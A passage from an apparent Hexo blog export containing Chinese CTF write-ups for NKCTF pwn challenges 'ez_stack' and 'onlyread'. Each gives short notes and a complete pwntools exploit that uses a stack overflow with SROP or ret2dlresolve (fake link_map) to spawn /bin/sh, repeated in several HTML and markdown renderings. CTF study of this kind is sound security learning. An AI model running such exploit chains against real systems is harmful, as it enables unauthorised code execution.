plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x0000000000401147 : mov eax, 0xf ; ret</span><br><span class=\"line\">0x0000000000401146 : mov rax, 0xf ; ret</span><br></pre></td></tr></table></figure>\n\n<p>要通过SROP执行<code>execve(&quot;/bin/sh\\x00&quot;,0,0)</code>，需要找到<code>&quot;/bin/sh\\x00&quot;</code>的地址，但程序中没有，需要我们自行写入。</p>\n<p>但程序唯一一次写入的是栈上，有<code>ASLR</code>没办法定位，这里利用寄存器留下的值并通过<strong>ROP</strong>设置部分参数再次执行<code>sys_read</code>，将<code>&quot;/bin/sh\\x00&quot;</code>写入<code>bss</code>段。（当然<strong>也可以利用SROP直接执行<code>SYS_READ</code>写入</strong>）</p>\n<p>之后通过SROP执行<code>execve(&quot;/bin/sh\\x00&quot;,0,0)</code>即可<code>get shell</code>。</p>\n<p>找到的wp大多是py2的，之前也没试过用py3写SROP，这里的应该用<code>bytes(frame)</code>转化<code>frame</code>的类型</p>\n<p><strong>exp：</strong> </p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;ez_stack&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#libc=ELF(&#x27;&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./&#x27;+filename)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;node.yuzhian.com.cn&#x27;</span>,<span class=\"number\">34603</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\">mov_rax_0xf=<span class=\"number\">0x0000000000401146</span></span><br><span class=\"line\">syscall=<span class=\"number\">0x000000000040114e</span></span><br><span class=\"line\">mov_rax_0_pop_rbp=<span class=\"number\">0x00000000004011f0</span></span><br><span class=\"line\">pop_rdi=<span class=\"number\">0x0000000000401283</span></span><br><span class=\"line\">pop_rsi_r15=<span class=\"number\">0x0000000000401281</span></span><br><span class=\"line\">bss_addr=elf.bss()</span><br><span class=\"line\">frame = SigreturnFrame()</span><br><span class=\"line\">frame.rax = <span class=\"number\">59</span></span><br><span class=\"line\">frame.rdi = bss_addr</span><br><span class=\"line\">frame.rip=syscall</span><br><span class=\"line\">r()</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x18</span>+p64(pop_rsi_r15)+p64(bss_addr)*<span class=\"number\">2</span>+p64(mov_rax_0_pop_rbp)+p64(bss_addr)+p64(syscall)</span><br><span class=\"line\">payload+=p64(mov_rax_0xf)+p64(syscall)</span><br><span class=\"line\">payload+=<span class=\"built_in\">bytes</span>(frame)</span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">s(payload)</span><br><span class=\"line\">s(<span class=\"string\">&quot;/bin/sh\\x00&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<p>nkctf的ezstack，走SROP。</p>","more":"<p>没开RELRP、Canary和PIE</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/a1ph0nse/PwnPractice/CtfGame/NK/ezstack/ez_stack&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n\n<p>找<code>gadget</code>找到了这些，<code>0xf</code>对应的系统调用是<code>sigreturn</code>，看来应该是走SROP了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x0000000000401147 : mov eax, 0xf ; ret</span><br><span class=\"line\">0x0000000000401146 : mov rax, 0xf ; ret</span><br></pre></td></tr></table></figure>\n\n<p>要通过SROP执行<code>execve(&quot;/bin/sh\\x00&quot;,0,0)</code>，需要找到<code>&quot;/bin/sh\\x00&quot;</code>的地址，但程序中没有，需要我们自行写入。</p>\n<p>但程序唯一一次写入的是栈上，有<code>ASLR</code>没办法定位，这里利用寄存器留下的值并通过<strong>ROP</strong>设置部分参数再次执行<code>sys_read</code>，将<code>&quot;/bin/sh\\x00&quot;</code>写入<code>bss</code>段。（当然<strong>也可以利用SROP直接执行<code>SYS_READ</code>写入</strong>）</p>\n<p>之后通过SROP执行<code>execve(&quot;/bin/sh\\x00&quot;,0,0)</code>即可<code>get shell</code>。</p>\n<p>找到的wp大多是py2的，之前也没试过用py3写SROP，这里的应该用<code>bytes(frame)</code>转化<code>frame</code>的类型</p>\n<p><strong>exp：</strong> </p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;ez_stack&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#libc=ELF(&#x27;&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./&#x27;+filename)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;node.yuzhian.com.cn&#x27;</span>,<span class=\"number\">34603</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\">mov_rax_0xf=<span class=\"number\">0x0000000000401146</span></span><br><span class=\"line\">syscall=<span class=\"number\">0x000000000040114e</span></span><br><span class=\"line\">mov_rax_0_pop_rbp=<span class=\"number\">0x00000000004011f0</span></span><br><span class=\"line\">pop_rdi=<span class=\"number\">0x0000000000401283</span></span><br><span class=\"line\">pop_rsi_r15=<span class=\"number\">0x0000000000401281</span></span><br><span class=\"line\">bss_addr=elf.bss()</span><br><span class=\"line\">frame = SigreturnFrame()</span><br><span class=\"line\">frame.rax = <span class=\"number\">59</span></span><br><span class=\"line\">frame.rdi = bss_addr</span><br><span class=\"line\">frame.rip=syscall</span><br><span class=\"line\">r()</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x18</span>+p64(pop_rsi_r15)+p64(bss_addr)*<span class=\"number\">2</span>+p64(mov_rax_0_pop_rbp)+p64(bss_addr)+p64(syscall)</span><br><span class=\"line\">payload+=p64(mov_rax_0xf)+p64(syscall)</span><br><span class=\"line\">payload+=<span class=\"built_in\">bytes</span>(frame)</span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">s(payload)</span><br><span class=\"line\">s(<span class=\"string\">&quot;/bin/sh\\x00&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>"},{"title":"nkctf_onlyread","date":"2023-03-26T14:05:12.000Z","_content":"\nnkctf的onlyread，前面的逆向看了好一会，后面的栈溢出一开始甚至想爆破，但后来想起有个少见的`ret2dlresolve`。\n\n<!-- more -->\n\n编码后和固定的字符串比较，通过4次比较后有一个栈溢出\n\n这个编码有点像base64，改改就能过。\n\n过完4次比较后发现完全没有输出函数，leak不了libcbase，用ret2dlresolve，上网找了个模板。\n\n**exp:**\n\n```py\nfrom pwn import *\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='pwn'\nelf=ELF('./'+filename)\nlibc=ELF('../story_attachment/libc.so.6')  \np=process('./'+filename)\n# p=remote('node2.yuzhian.com.cn',)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ns('V2VsY29tZSB0byBOS0NURiE=')\nsleep(1)\ns('dGVsbCB5b3UgYSBzZWNyZXQ6')\nsleep(1)\ns('SSdNIFJVTk5JTkcgT04gR0xJQkMgMi4zMS0wdWJ1bnR1OS45')\nsleep(1)\ns('Y2FuIHlvdSBmaW5kIG1lPw==')\n\n\nread_plt=elf.plt['read']  \nwrite_got=elf.got['read']  \nvuln_addr=elf.sym['main']  \nplt0=elf.get_section_by_name('.plt').header.sh_addr\n\n#bss  \nbss=0x404060 \nbss_stage=bss+0x100\nl_addr=libc.sym['system']-libc.sym['read']  \n  \npop_rdi=0x0000000000401683  \npop_rsi=0x0000000000401681  \n\nplt_load=plt0+6\n\ndef fake_Linkmap_payload(fake_linkmap_addr,known_func_ptr,offset):\n    linkmap=p64(offset&(2**64-1))\n\n    linkmap+=p64(0) \n    linkmap+=p64(fake_linkmap_addr+0x18) \n\n    linkmap+=p64((fake_linkmap_addr+0x30-offset)&(2**64-1)) \n    linkmap+=p64(0x7) \n    linkmap+=p64(0)\n\n    linkmap+=p64(0)\n\n    linkmap+=p64(0) \n    linkmap+=p64(known_func_ptr - 0x8) \n\n    linkmap+=b'/bin/sh\\x00'\n    linkmap=linkmap.ljust(0x68,b'a')\n    linkmap+=p64(fake_linkmap_addr) \n    linkmap+=p64(fake_linkmap_addr+0x38) \n    linkmap=linkmap.ljust(0xf8,b'a')\n    linkmap+=p64(fake_linkmap_addr+0x8) \n    return linkmap\n\nfake_link_map=fake_Linkmap_payload(bss_stage, write_got ,l_addr)\n\npayload=b'a'*56+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss_stage)+p64(0)+p64(read_plt)\npayload+=p64(pop_rsi)+p64(0)*2\npayload+=p64(pop_rdi)+p64(bss_stage+0x48)+p64(plt_load)+p64(bss_stage)+p64(0)\n\nsl(payload)  \n\ns(fake_link_map) \n\nitr()\n```\n\n","source":"_posts/nkctf_onlyread.md","raw":"---\ntitle: nkctf_onlyread\ndate: 2023-03-26 22:05:12\ncategories: \n- pwn_wp\ntags: \n- pwn\n- re\n- ret2dlsolve\n\n---\n\nnkctf的onlyread，前面的逆向看了好一会，后面的栈溢出一开始甚至想爆破，但后来想起有个少见的`ret2dlresolve`。\n\n<!-- more -->\n\n编码后和固定的字符串比较，通过4次比较后有一个栈溢出\n\n这个编码有点像base64，改改就能过。\n\n过完4次比较后发现完全没有输出函数，leak不了libcbase，用ret2dlresolve，上网找了个模板。\n\n**exp:**\n\n```py\nfrom pwn import *\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='pwn'\nelf=ELF('./'+filename)\nlibc=ELF('../story_attachment/libc.so.6')  \np=process('./'+filename)\n# p=remote('node2.yuzhian.com.cn',)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ns('V2VsY29tZSB0byBOS0NURiE=')\nsleep(1)\ns('dGVsbCB5b3UgYSBzZWNyZXQ6')\nsleep(1)\ns('SSdNIFJVTk5JTkcgT04gR0xJQkMgMi4zMS0wdWJ1bnR1OS45')\nsleep(1)\ns('Y2FuIHlvdSBmaW5kIG1lPw==')\n\n\nread_plt=elf.plt['read']  \nwrite_got=elf.got['read']  \nvuln_addr=elf.sym['main']  \nplt0=elf.get_section_by_name('.plt').header.sh_addr\n\n#bss  \nbss=0x404060 \nbss_stage=bss+0x100\nl_addr=libc.sym['system']-libc.sym['read']  \n  \npop_rdi=0x0000000000401683  \npop_rsi=0x0000000000401681  \n\nplt_load=plt0+6\n\ndef fake_Linkmap_payload(fake_linkmap_addr,known_func_ptr,offset):\n    linkmap=p64(offset&(2**64-1))\n\n    linkmap+=p64(0) \n    linkmap+=p64(fake_linkmap_addr+0x18) \n\n    linkmap+=p64((fake_linkmap_addr+0x30-offset)&(2**64-1)) \n    linkmap+=p64(0x7) \n    linkmap+=p64(0)\n\n    linkmap+=p64(0)\n\n    linkmap+=p64(0) \n    linkmap+=p64(known_func_ptr - 0x8) \n\n    linkmap+=b'/bin/sh\\x00'\n    linkmap=linkmap.ljust(0x68,b'a')\n    linkmap+=p64(fake_linkmap_addr) \n    linkmap+=p64(fake_linkmap_addr+0x38) \n    linkmap=linkmap.ljust(0xf8,b'a')\n    linkmap+=p64(fake_linkmap_addr+0x8) \n    return linkmap\n\nfake_link_map=fake_Linkmap_payload(bss_stage, write_got ,l_addr)\n\npayload=b'a'*56+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss_stage)+p64(0)+p64(read_plt)\npayload+=p64(pop_rsi)+p64(0)*2\npayload+=p64(pop_rdi)+p64(bss_stage+0x48)+p64(plt_load)+p64(bss_stage)+p64(0)\n\nsl(payload)  \n\ns(fake_link_map) \n\nitr()\n```\n\n","slug":"nkctf_onlyread","published":1,"updated":"2023-03-30T08:19:38.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czagc00545oud5ffshmru","content":"<p>nkctf的onlyread，前面的逆向看了好一会，后面的栈溢出一开始甚至想爆破，但后来想起有个少见的<code>ret2dlresolve</code>。</p>\n<span id=\"more\"></span>\n\n<p>编码后和固定的字符串比较，通过4次比较后有一个栈溢出</p>\n<p>这个编码有点像base64，改改就能过。</p>\n<p>过完4次比较后发现完全没有输出函数，leak不了libcbase，用ret2dlresolve，上网找了个模板。</p>\n<p><strong>exp:</strong></p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;pwn&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;../story_attachment/libc.so.6&#x27;</span>)  </span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\"># p=remote(&#x27;node2.yuzhian.com.cn&#x27;,)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\">s(<span class=\"string\">&#x27;V2VsY29tZSB0byBOS0NURiE=&#x27;</span>)</span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">s(<span class=\"string\">&#x27;dGVsbCB5b3UgYSBzZWNyZXQ6&#x27;</span>)</span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">s(<span class=\"string\">&#x27;SSdNIFJVTk5JTkcgT04gR0xJQkMgMi4zMS0wdWJ1bnR1OS45&#x27;</span>)</span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">s(<span class=\"string\">&#x27;Y2FuIHlvdSBmaW5kIG1lPw==&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">read_plt=elf.plt[<span class=\"string\">&#x27;read&#x27;</span>]  </span><br><span class=\"line\">write_got=elf.got[<span class=\"string\">&#x27;read&#x27;</span>]  </span><br><span class=\"line\">vuln_addr=elf.sym[<span class=\"string\">&#x27;main&#x27;</span>]  </span><br><span class=\"line\">plt0=elf.get_section_by_name(<span class=\"string\">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#bss  </span></span><br><span class=\"line\">bss=<span class=\"number\">0x404060</span> </span><br><span class=\"line\">bss_stage=bss+<span class=\"number\">0x100</span></span><br><span class=\"line\">l_addr=libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]-libc.sym[<span class=\"string\">&#x27;read&#x27;</span>]  </span><br><span class=\"line\">  </span><br><span class=\"line\">pop_rdi=<span class=\"number\">0x0000000000401683</span>  </span><br><span class=\"line\">pop_rsi=<span class=\"number\">0x0000000000401681</span>  </span><br><span class=\"line\"></span><br><span class=\"line\">plt_load=plt0+<span class=\"number\">6</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">fake_Linkmap_payload</span>(<span class=\"params\">fake_linkmap_addr,known_func_ptr,offset</span>):</span><br><span class=\"line\">    linkmap=p64(offset&amp;(<span class=\"number\">2</span>**<span class=\"number\">64</span>-<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    linkmap+=p64(<span class=\"number\">0</span>) </span><br><span class=\"line\">    linkmap+=p64(fake_linkmap_addr+<span class=\"number\">0x18</span>) </span><br><span class=\"line\"></span><br><span class=\"line\">    linkmap+=p64((fake_linkmap_addr+<span class=\"number\">0x30</span>-offset)&amp;(<span class=\"number\">2</span>**<span class=\"number\">64</span>-<span class=\"number\">1</span>)) </span><br><span class=\"line\">    linkmap+=p64(<span class=\"number\">0x7</span>) </span><br><span class=\"line\">    linkmap+=p64(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    linkmap+=p64(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    linkmap+=p64(<span class=\"number\">0</span>) </span><br><span class=\"line\">    linkmap+=p64(known_func_ptr - <span class=\"number\">0x8</span>) </span><br><span class=\"line\"></span><br><span class=\"line\">    linkmap+=<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span></span><br><span class=\"line\">    linkmap=linkmap.ljust(<span class=\"number\">0x68</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">    linkmap+=p64(fake_linkmap_addr) </span><br><span class=\"line\">    linkmap+=p64(fake_linkmap_addr+<span class=\"number\">0x38</span>) </span><br><span class=\"line\">    linkmap=linkmap.ljust(<span class=\"number\">0xf8</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">    linkmap+=p64(fake_linkmap_addr+<span class=\"number\">0x8</span>) </span><br><span class=\"line\">    <span class=\"keyword\">return</span> linkmap</span><br><span class=\"line\"></span><br><span class=\"line\">fake_link_map=fake_Linkmap_payload(bss_stage, write_got ,l_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">56</span>+p64(pop_rdi)+p64(<span class=\"number\">0</span>)+p64(pop_rsi)+p64(bss_stage)+p64(<span class=\"number\">0</span>)+p64(read_plt)</span><br><span class=\"line\">payload+=p64(pop_rsi)+p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span></span><br><span class=\"line\">payload+=p64(pop_rdi)+p64(bss_stage+<span class=\"number\">0x48</span>)+p64(plt_load)+p64(bss_stage)+p64(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">sl(payload)  </span><br><span class=\"line\"></span><br><span class=\"line\">s(fake_link_map) </span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<p>nkctf的onlyread，前面的逆向看了好一会，后面的栈溢出一开始甚至想爆破，但后来想起有个少见的<code>ret2dlresolve</code>。</p>","more":"<p>编码后和固定的字符串比较，通过4次比较后有一个栈溢出</p>\n<p>这个编码有点像base64，改改就能过。</p>\n<p>过完4次比较后发现完全没有输出函数，leak不了libcbase，用ret2dlresolve，上网找了个模板。</p>\n<p><strong>exp:</strong></p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span 